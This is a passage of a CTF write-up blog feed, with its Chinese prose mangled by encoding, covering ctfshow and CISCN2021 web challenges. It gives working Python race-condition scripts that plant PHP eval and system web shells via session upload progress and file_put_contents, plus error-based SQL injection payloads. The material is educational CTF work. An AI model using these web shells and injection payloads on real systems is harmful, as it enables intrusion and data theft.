class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://4bd1dd58-0b1c-4019-8f55-44ad4dbea031.challenge.ctf.show:8080/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¿®æ”¹ä»£ç è¯»å–fl0g.php<br><img src="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ctfhshow-webå…¥é—¨-web149"><a href="#ctfhshow-webå…¥é—¨-web149" class="headerlink" title="ctfhshow [webå…¥é—¨]-web149"></a>ctfhshow [webå…¥é—¨]-web149</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨bpä¸æ–­è®¿é—®å¹¶ä¼ å‚ï¼Œç„¶åå¼€ä¸€ä¸ªå»ä¸æ–­è®¿é—® 1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=<span class="hljs-number">1.</span>php<br>show=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;tac /c*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨è„šæœ¬å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://ae3929ad-8f8f-4dc5-88c9-511d15e5625d.chall.ctf.show:8080/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        data = &#123;<br>            <span class="hljs-string">&#x27;show&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php system(&quot;ls /&quot;);?&gt;&#x27;</span><br>        &#125;<br>        W_reponse = requests.post(url+<span class="hljs-string">&quot;?ctf=1.php&quot;</span>,data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        R_reponse = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> R_reponse.status_code != <span class="hljs-number">404</span>:<br>            print(R_reponse.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;[*]continued&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># é€šè¿‡threading.Event()å¯ä»¥åˆ›å»ºä¸€ä¸ªäº‹ä»¶ç®¡ç†æ ‡å¿—ï¼Œè¯¥æ ‡å¿—ï¼ˆeventï¼‰é»˜è®¤ä¸ºFalse</span><br>    event = threading.Event()<br>    <span class="hljs-comment"># å°†eventçš„æ ‡å¿—è®¾ç½®ä¸ºTrueï¼Œè°ƒç”¨waitæ–¹æ³•çš„æ‰€æœ‰çº¿ç¨‹å°†è¢«å”¤é†’ï¼›</span><br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=write).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=read).start()<br></code></pre></td></tr></table></figure><p>è·‘è„šæœ¬ï¼Œå‘ç°äº†ctfshow_fl0g_here.txtæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¿®æ”¹ä¸ºcat /ctfshow_fl0g_here.txtç»§ç»­è·‘è„šæœ¬ï¼Œå³å¯å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2021èµ›åå¤ç°</title>
    <link href="/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="esay-sql"><a href="#esay-sql" class="headerlink" title="esay_sql"></a>esay_sql</h2><p>è¾“å…¥å•å¼•å·æŠ¥é”™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span><span class="hljs-string">&#x27;123456&#x27;</span><span class="hljs-string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/4903b7830329ec519a9add06ecbd160d.png" alt="image-20210515182436750"><br>sqlmapè·‘äº†ä¸€ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><p>1.çˆ†åº“å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,database(),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~security~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>2.çˆ†è¡¨å</p><p>çŒœæµ‹è¡¨åä¸ºflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Operand should contain 1 column(s)</span><br></code></pre></td></tr></table></figure><p>3.çˆ†åˆ—å</p><p>è¿‡æ»¤äº†information_schemaå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨join æ— åˆ—åæ³¨å…¥</p><p>å¾—åˆ°idåˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag )b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>id<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°noåˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>no<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ea1235fa-d397-474b-8188-dedbe352ffc7åˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id,no))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>ea1235fa-d397<span class="hljs-number">-474</span>b<span class="hljs-number">-8188</span>-dedbe352ffc7<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>4.çˆ†å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-s<br></code></pre></td></tr></table></figure><p>å› ä¸ºæŠ¥é”™æ³¨å…¥é™åˆ¶åªèƒ½è¯»å–ä¸€åŠflagï¼Œç”¨rightè¯»å–å³åŠéƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,right((select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),20),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~-qiG07-oHt4u-shqSb-&#125;~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b33f074e5d8a9425d7463e89e4510ba4.png" alt="image-20210515184620854"><br>æ¶ˆå»é‡å¤éƒ¨åˆ†ï¼Œæœ€ç»ˆflagä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-shqSb-&#125;<br></code></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>ä¸€é“åŸé¢˜ï¼Œå‚è€ƒ<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">wp</a>å¤ç°çš„<br>é¢˜ç›®æè¿°ï¼šä½ çŸ¥é“å¼€å‘ä¸€ä¸ªphpç¨‹åºå¾ˆé‡è¦çš„ä¸œè¥¿æ˜¯ä»€ä¹ˆå—ï¼ˆflagåœ¨ä½ çœ‹ä¸åˆ°çš„åœ°æ–¹ï¼‰</p><p>æœ€é‡è¦çš„å°±æ˜¯å¤‡ä»½ï¼Œè®¿é—®.index.php.swoå¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs php">æœ¬é¢˜ç›®æ²¡æœ‰å…¶ä»–ä»£ç äº†å™¢ï¼Œå°±åªæœ‰è¿™ä¸€ä¸ªæ–‡ä»¶ï¼Œè™½ç„¶ä½ çœ‹åˆ°çš„ä¸å®Œå…¨ï¼Œä½†æ˜¯ä½ è§‰å¾—æˆ‘ä¼šæŠŠflagè—åœ¨å“ªé‡Œå‘¢ï¼Œä»”ç»†æƒ³æƒ³æ–‡ä»¶é‡Œé¢è¿˜æœ‰ä»€ä¹ˆï¼Ÿ<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">j</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">k</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">m</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">o</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">r</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-variable">$rc</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rc&quot;</span>];<br><span class="hljs-variable">$rb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rb&quot;</span>];<br><span class="hljs-variable">$ra</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ra&quot;</span>];<br><span class="hljs-variable">$rd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rd&quot;</span>];<br><span class="hljs-variable">$method</span>= <span class="hljs-keyword">new</span> <span class="hljs-variable">$rc</span>(<span class="hljs-variable">$ra</span>, <span class="hljs-variable">$rb</span>);<br>var_dump(<span class="hljs-variable">$method</span>-&gt;<span class="hljs-variable">$rd</span>());<br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºï¼Œæœ¬é¢˜å°±è¿™ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”æç¤ºçœ‹åˆ°çš„ä¸å®Œå…¨ï¼ŒçŒœæµ‹ flagè¢«æ³¨é‡Šäº†ï¼Œè€Œä¸”åœ¨ç±»ä¸­è¢«æ³¨é‡Šäº†ã€‚</p><p>éœ€è¦GETæäº¤å››ä¸ªå‚æ•°ï¼Œå¯ä»¥å®ä¾‹åŒ–ä»»æ„ç±»ï¼Œå¹¶è°ƒç”¨ç±»æ–¹æ³•ã€‚åˆ©ç”¨ PHPå†…ç½®ç±»ä¸­çš„ ReflectionMethod æ¥è¯»å– User ç±»é‡Œé¢å„ä¸ªå‡½æ•°çš„æ³¨é‡Š</p><p>æœ¬åœ°æµ‹è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//pubLic $b = 100;</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Increment counter</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@final</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@static</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span>  publicCISCN&#123;test&#125;</span><br><span class="hljs-comment"> * <span 